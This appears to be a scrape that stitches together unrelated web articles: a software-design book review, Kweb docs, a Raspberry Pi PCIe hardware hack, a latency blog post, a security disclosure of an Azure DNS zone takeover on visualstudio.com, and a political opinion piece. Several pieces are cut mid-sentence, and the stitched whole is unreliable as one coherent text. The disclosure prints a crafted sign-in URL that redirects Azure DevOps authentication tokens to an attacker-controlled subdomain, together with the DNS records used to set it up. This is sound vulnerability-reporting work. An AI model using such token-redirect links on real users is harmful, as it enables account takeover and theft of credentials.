<p>The book, then, is a synthesis of the pieces of wisdom that Ousterhout has himself learned from his own experiences, tempered and refined by the practical examples he has been able to draw from his students.  In this way, it has a (somewhat) scientific, research-based approach, where the author's assertions are backed up with examples from student projects that worked (or didn't).</p>
<p>At it's core, though, this is still philosophy - the book doesn't just list the things that worked well, and the things that worked poorly.  Instead, Ousterhout attempts in each chapter to divine broader truths that apply to software design in general.  There are no lists of what to do and what not to do, but instead principles to follow, red flags to be aware of, and warnings against taking anything too far.</p>
<h2>Structure</h2>
<p>The book is split into a series of chapters, each of which generally explores a single principle.  These range from the very high level ("Working Code Isn't Enough", "Modules Should Be Deep") to the more practical questions ("Choosing Names").  The whole book is relatively short (about 180 pages), and many chapters flow together nicely, which means that it's quite easy to go from cover-to-cover, rather than approach the book as a reference manual.  That said, the final pages provide summaries of the design principles and red flags found in the book, making it easy to reference key parts of the book.</p>
<p>Within each chapter, Ousterhout generally starts by stating a problem or motivation that software engineers will face, and then defining a principle to solve this.  The rest of the chapter is then a discussion of the principle, the dangers of alternative approaches, the red flags that indicate that the principle needs to be applied (or in some cases avoided), and some notes about taking ideas too far.</p>
<p>The examples are often based on problems that Ousterhout has given his classes, which means that they generally feel meaty enough to be worth discussing.  An example of a text editor appears in Chapter 6, but is extended in Chapters 7, 8, 9, and 10 in different contexts.  Enough is omitted from most examples to make the point clear, but enough is kept in to give the feeling of real code.</p>
<h2>Ousterhout's Principles</h2>
<p>The overriding theme throughout the book is that good code <em>looks</em> good.  Ousterhout thinks very much in terms of abstraction and interfaces - where "interfaces" refers to the contact points between different units of abstraction, rather than any similarly-named construct in any particular language.  Most of the book is dedicated to figuring out how to spot bad abstractions and rework them into good abstractions.</p>
<p>To a certain extent, this feels at odds with certain common mantras in software engineering circles today, where we encourage enough other to Keep It Simple, Stupid, and worry about premature abstractions.  <em>Philosophy</em> seems to worry less about the dangers of over-abstraction, and more concerned with how to make sure that the chosen abstraction is a good one.</p>
<p>This approach makes for a more positive experience than in many other programming circles - rather than being warned into a very conservative approach, Ousterhout encourages his readers to go out and make abstractions, but to be careful about designing the correct ones.</p>
<p>This isn't to say that the book isn't also cautionary - in the summary pages at the back, the list of red flags gets more page space than the list of principles, and throughout the book these red flags mark out moments when readers are given the go ahead to use these abstraction techniques.  There are also warnings about when a principle might be used too much.</p>
<h2>Everyone's a Critic</h2>
<p>Beyond the mild danger of encouraging excess abstraction, the biggest issue in <em>Philosophy</em> is probably the missing parts - the topic of testing gets a single page in Chapter 19 (Software Trends), and ideas about effective use of a type system to avoid issues are largely ignored.  Ousterhout's principles will still apply in these areas, but it would be nice to see some more specific discussion of these areas.</p>
<h2>The Target Audience</h2>
<p>It can be a bit unclear at times to whom Ousterhout writes.  A lot of the examples clearly relate to his students, and the projects that they come from have a somewhat academic feel - a text editor here, and an HTTP protocol parser there.  The code in the examples is generally object-oriented (Java and occasional C++), although it generally feels like it could be replaced with most imperative/OO languages without much of an effect.</p>
<p>The use of the phrase "software design" might make one think more of broader software architecture, but Ousterhout uses it more to describe the design of individual modules and functions <em>within</em> a program, rather than the broader architecture of the program itself (although he occasionally touches on that).</p>
<p>More functionally-minded people might think they can simply side-step a lot of the discussion here, in the same way that they can when discussing the Gang of Four's design patterns, but the principle "design errors out of existence" (Chapter 10) and its corollary "design special cases out of existence" should ring bells for people in this area who are also aware of the principle of making illegal states unrepresentable.</p>
<p>Ultimately, I think this book aims at a space that is slightly deeper than a lot of existing software literature.  Where books like <em>Design Patterns</em>, Fowler's <em>Refactoring</em>, and the aforementioned <em>Clean Code</em> are aimed at more traditional "enterprise" software development, <em>Philosophy</em> feels more widely applicable, albeit at the cost of being more abstract and difficult to apply.</p>
<p>In general, I think <em>Philosophy</em> is a good read if you are both (a) working with software regularly, and (b) conscious of the inherent maintenance cost in software, and aiming to minimise it.</p>
<h2>A Book to Recommend</h2>
<p>The original question I wanted to answer was what we, as software engineers, should recommend over books like <em>Clean Code</em>.  As I said, my answer to that question is <em>A Philosophy of Software Design</em>.</p>
<p>Software engineering (indeed, engineering in general) is not a science, insofar as there are no (or at least very few) exact answers.  Everything from the database you use to your choice of testing strategy will be dependent on the context of the software you're writing.  This means that the advice that we give to each other will probably be very context-specific.  In general, you probably shouldn't use a NoSQL database, but in a lot of specific contexts you probably should.</p>
<p>This isn't a problem if we don't run into these exceptional cases often, but engineering is all about exceptional cases - if there were no exceptional cases, we wouldn't need to write any new software, because our existing tools would do the job.  This is where books like <em>Philosophy</em> come in - rather than give situational advice, it attempts to define wider principles that the reader will then need to apply to different situations.</p>
<p>Take, for example, my favourite principle: "Modules should be deep" (explored in Chapter 4).  The idea is that an individual unit of abstraction should do a lot of work (i.e. be deep, and contain a lot of complexity), but it should have a relatively simple interface (i.e. be narrow).  Essentially, if you're going to abstract something, make sure your abstraction is deep.</p>
<p>Notice that this principle says nothing about functions, classes, lines, blocks, parameters, or anything specific to a single language or paradigm.  However, when we apply it, for example to the Java code Robert C. Martin talks about in <em>Clean Code</em>, we can derive some of his ideas from this principle.  Assuming a function is our unit of abstraction (for now, at least), the parameters are its interface, therefore we should reduce the number of parameters to the minimum necessary.</p>
<p>However, because our principle is more general, we can actually correct some of the mistakes Martin makes.  Martin talks about removing parameters by adding private fields to the class that the method belongs to.  When we think in terms of interfaces, we notice that this <em>hasn't decreased the interface at all</em> - we've lost a parameter, but we've gained a private field, and in the process made things harder for the consumer of our abstraction.</p>
<h2>Teaching Principles Over Rules</h2>
<p>When I recommend books, I generally hope that the other person will learn something from the book I have suggested.  If I were to recommend <em>Clean Code</em>, I would hope that the reader would learn something about how to write clean Java code, but I suspect they would mainly learn how to write code like Robert C. Martin - or more accurately, like someone copying Robert C. Martin's actions without always understanding why he's taking them.</p>
<p>I do not feel this way about <em>A Philosophy of Software Design</em>.  When I recommend it, I expect that the reader will not just learn something about Java, …</p></div></div></div>

<h2>Motivation<a href="#motivation" title="Permalink to this headline">¶</a></h2>
<p>Modern websites consist of at least two <a href="https://en.wikipedia.org/wiki/Coupling_(computer_programming)">tightly coupled</a> components, one runs in the browser, the other on the server.  These are often written in different programming languages and must communicate with each other over an HTTP connection.</p>
<p>Kweb’s goal is to eliminate this server/browser separation so that your webapp’s architecture is determined by the problem you’re solving, rather than the limitations of today’s tools.</p>
</div>
<div id="how-does-it-work">
<h2>How does it work?<a href="#how-does-it-work" title="Permalink to this headline">¶</a></h2>
<p>Kweb is a self-contained Kotlin library that can be added easily to new or existing projects.  When Kweb receives
a HTTP request it responds with the initial HTML page, and some JavaScript that connects back to the web server via a WebSocket.  The page then waits and listens for instructions from the server, while notifying the server of relevant browser events.</p>
<p>A common concern about this approach is that the user interface might feel sluggish if it is server driven. Kweb solves this problem by <a href="https://docs.kweb.io/en/latest/events.html#immediate-events">preloading</a> instructions to
the browser to be executed immediately on browser events without a server round-trip.</p>
<p>We’ve designed Kweb to be efficient in both the browser and server, and makes effective use of Kotlin’s concurrency features, particularly <a href="https://kotlinlang.org/docs/reference/coroutines-overview.html">coroutines</a>.</p>
</div>
<div id="features">

RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller.

The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>!

For some software latency can business critical:</p><ul><li><a href="https://en.wikipedia.org/wiki/Real-time_computing" target="_blank" rel="nofollow noopener noreferrer">Real-time computing</a> where operations must guarantee completion under a deadline.</li><li>A SaaS with latency SLAs that you need to meet for your enterprise customers </li><li>e-commerce that loses money when the site is slow (see this great blog post about <a href="http://blog.tacertain.com/p-four-nines/" target="_blank" rel="nofollow noopener noreferrer">Amazon</a>).</li></ul><p>You might also be writing software that you want to be “fast enough” or “not unnecessarily slow”.</p><p>While getting to concrete latency guarantees for critical cases requires a lot of work and investment, it is also true that latency is one of those things that is easy to overlook unless you are paying attention. Over time, small decisions can pile up and you can end up with a product that is a lot slower than it should be mostly because of <a href="http://faculty.salisbury.edu/~xswang/Research/Papers/SERelated/no-silver-bullet.pdf" target="_blank" rel="nofollow noopener noreferrer">accidental complexity, not essential complexity</a>. </p><p>The “broken windows” theory presents the problem in a nice way (From <a href="https://en.wikipedia.org/wiki/Broken_windows_theory" target="_blank" rel="nofollow noopener noreferrer">wikipedia</a>): <em>The broken windows theory is a criminological theory that states that visible signs of crime, anti-social behavior, and civil disorder create an urban environment that encourages further crime and disorder, including serious crimes. The theory suggests that policing methods that target minor crimes such as vandalism, loitering, public drinking, jaywalking and fare evasion help to create an atmosphere of order and lawfulness, thereby preventing more serious crimes.</em>
<img src="https://yenkel.dev/media/2020-06-27/broken-windows.jpg"></p><p>Whether the theory is correct or not (there is an interesting chapter on this in the book <a href="https://www.amazon.com/Freakonomics-Economist-Explores-Hidden-Everything/dp/0060731338" target="_blank" rel="nofollow noopener noreferrer">Freakonomics</a>) it is a useful context to talk about software. In the software industry, the Pragmatic Programmer book states <a href="https://www.artima.com/intv/fixit.html" target="_blank" rel="nofollow noopener noreferrer">“don’t live with broken windows”</a>.
If we apply this to latency it is easy to reason that if you let small decisions/changes increase latency, over time the latency of the system will continuously increase over time. At some point, going back and figuring things out will be overly complex and sometimes teams decide to go for complicated solutions to solve this problem. We want to avoid that.</p><p>One of the things we do at <a href="http://auth0.com/" target="_blank" rel="nofollow noopener noreferrer">Auth0</a> is iterative delivery. Initial versions of code work and are tested, etc., but until we validate features with customers we avoid investing in optimizations. </p><p>However, some things can be done in an initial implementation so we don’t need to optimize later, as that’s when as a developer you have the context about what you are doing. Re-thinking many small decisions a few weeks down the road is less than ideal. In this context, thinking about “expensive operations” latency wise is useful.</p><p>As part of a project, we are working on developing a new service (<code>new-service</code>) and adding some calls to it from an existing service (<code>client</code>). As we reviewed the changes we made to the <code>client</code> with the team, we found several opportunities for improvement.</p><p>The code snippets below are examples written using Javascript, but these ideas are language agnostic.</p><h2 id="parallel-io"><a href="#parallel-io" aria-label="parallel io permalink"></a>Parallel I/O</h2><blockquote><p>When I/O ops do not depend on each other and you need all data if possible use parallel queries.</p></blockquote><p>Let’s say a change to client code looked like this:</p><div data-language="js"><pre><code>     <span>const</span> a <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    </code></pre></div><p>The <code>getDataFromNewService(...)</code> call performs network I/O. Because we are working on this <code>new-service</code>, we know it also does more network I/O to talk to a database (which might need to do some disk I/O). All of these operations are naturally in the slow end of the spectrum from the <a href="#latency-table">table at the beginning of this blog post</a>.</p><p>If we can’t avoid the operations, performing these in parallel yields some clear benefits. If the resulting code looks like this:</p><div data-language="js"><pre><code><span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>,</span> 
    <span>callNewService</span><span>(</span><span>...</span><span>)</span>
<span>]</span><span>)</span><span>;</span></code></pre></div><p>If we call the time for these operations <code>t1</code> (<code>existing-service</code>) and <code>t2</code> (<code>new-service</code>), in the last example we change the latency from <code>sum(t1, t2)</code> to <code>max(t1, t2)</code>. That even means that if we don’t want to make latency higher than the original, all we need to do is ensure <code>t2 &lt;= t1</code>!</p><h2 id="pre-fetching"><a href="#pre-fetching" aria-label="pre fetching permalink"></a>Pre-fetching</h2><blockquote><p>When I/O operations op2 only runs if op1 is likely to be successful, if op1 is likely to be successful in most cases, consider doing op2 in parallel (<a href="https://en.wikipedia.org/wiki/Prefetching" target="_blank" rel="nofollow noopener noreferrer">pre-fetching</a>).</p></blockquote><p>This case is similar to the previous one, but might be easier to miss. Let’s say the code after the change looks like this:</p><div data-language="js"><pre><code>    <span>const</span> param <span>=</span> <span>...</span>
    <span>const</span> exists <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span>param<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
        
    <span>}</span>
<span>+</span>   <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span>param<span>)</span><span>;</span>
<span>+</span>   </code></pre></div><p>Both function calls depend on <code>param</code>, which is available before calling <code>callExistingService(param)</code>. If the likelihood of <code>exists</code> being false is low, then calling <code>callNewService(param)</code> in parallel is likely worth it. You won’t be adding a lot more load to <code>new-service</code> in case <code>exists === false</code>, but you will be getting the aforementioned benefits for parallel I/O.</p><p>The latency improved code would look like this:</p><div data-language="js"><pre><code><span>const</span> param <span>=</span> <span>...</span>
<span>const</span> <span>[</span>exists<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
  <span>callExistingService</span><span>(</span>param<span>)</span><span>,</span> 
  <span>callNewService</span><span>(</span>param<span>)</span><span>]</span><span>)</span><span>;</span>

<span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
    
<span>}</span>
</code></pre></div><h2 id="no-op"><a href="#no-op" aria-label="no op permalink"></a>No-op</h2><blockquote><p>When you can replace an I/O operation for a no-op, do it.</p></blockquote><p>The best performance/latency optimization is a “no-op”, i.e. figuring out how to prevent the call from happening. A simple way of doing this is caching. However, it is important to consider that caching does not need to be overly complicated and require every developer’s favorite hammer <a href="https://redis.io/" target="_blank" rel="nofollow noopener noreferrer">Redis</a>. It just means <em>to store the value of computation to prevent performing the computation again</em>. </p><p>The code we reviewed was doing this:</p><div data-language="js"><pre><code>    
    <span>const</span> context <span>=</span> <span>await</span> <span>hydrateContext</span><span>(</span><span>)</span><span>;</span>

<span>+</span>   <span>const</span> result <span>=</span> <span>callNewService</span><span>(</span>context<span>.</span>param<span>)</span><span>;</span></code></pre></div><p>In this situation, the <code>client</code> had a way to store the result of a previous call to <code>new-service</code> that returned the same value. If <code>result</code> is relatively small and does not change it can be stored with the context and loaded as part of <code>hydrateContext()</code>. That way, the call we can simply avoid <code>callNewService(context.param);</code>.</p><p>The fastest call is the call that never happens 😆</p><p>When you are working on code, don’t <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">optimize prematurely</a>. I recommend, however, you add a “mental checklist” item to focus on latency and cross it off before submitting a PR. That will help you find <a href="https://wiki.c2.com/?PrematureOptimization" target="_blank" rel="nofollow noopener noreferrer">Donald Knuth’s 3%</a>.</p><p>It is likely that just doing that and focusing on that latency for 10 minutes might point to small but valuable improvements that you can make, and accumulating latency over time.</p><p>Don’t live with latency broken windows!</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>

<div>
<p>Those that know me, know that I am both bold and resolute. I stand by my thoughts / comments, yet I attempt to keep an open mind, analyze a situation, self-reflect on any biases, and integrate feedback. I even go so far as to analyze my confidence level, see <a href="https://predictionbook.com/" target="_blank" rel="noopener noreferrer">predictionbook.com</a>.</p>
<p>With that in mind. I want to share how utterly angry and helpless I feel —</p>
<p>I can’t share my true thoughts, hell my analysis, of the current political situation in the U.S. Although I have written on it countless times, I end up deleting the posts.</p>
<p>Why?</p>
<p>It’s not safe to share thoughts.</p>
<h2>State of Affairs</h2>
<p>Today, sharing one’s opinion can cost you your livelihood, your ability to communicate, and more.</p>
<p>Historically, that was always true, perhaps more-so. We’re now returning to the status quo — repression.</p>
<p>Today’s flavor of repression is one where offending someone randomly across the globe, can cost you your job. That person may not have a standing in your community and may not have a relationship with your employer. However, they can amplify their voice, tweet your employer, and your employer (scared out of it’s mind by the current situation) will terminate you. That is the state of affairs today. It doesn’t matter if you’re correct or innocent. It doesn’t even matter if 99.9% of people aren’t offended by what you said — we are now in a world of “<a href="https://en.wikipedia.org/wiki/Online_shaming#Cancellation" target="_blank" rel="noopener noreferrer">cancel culture</a>“.</p>
<h2>Finding Middle Ground</h2>
<p>In the United States in 2020, we have two paths. One path leads to an ever more left-leaning populous “uprising”; the other path leads to an ever more right-leaning populous “uprising”. I don’t see an alternative, outside of some quite-frankly comical alternatives (e.g. President Mitt Romney, with VP Bernie Sanders).</p>
<p>One way or another, I lose. No one is speaking up for my beliefs or representing me.</p>
<p>I sense I’m not alone. Everyone I speak to left or right, hates the current state of affairs. Most of us even agree on <em>why</em> we distrust the system. Unfortunately, we can’t elect someone to fix the system. Neither Trump, nor Biden, nor Bernie, nor anyone on the ballot accurately represents or even inspires us.</p>
<p>By and large, I believe this is due to the “absolute” nature of our current social strife. Take the question:</p>
<blockquote><p>Why can’t I be anti-vaccine and pro-choice?</p></blockquote>
<p>You would suspect everyone would agree that we “own” our bodies. If that were true, then you would effectively have to be pro-choice AND support people’s right to choose what to put in their bodies; body ownership is the middle ground. I wish we could coalesce around the middle ground, then compromise on edge cases, enabling progress.</p>
<p>Take another example:</p>
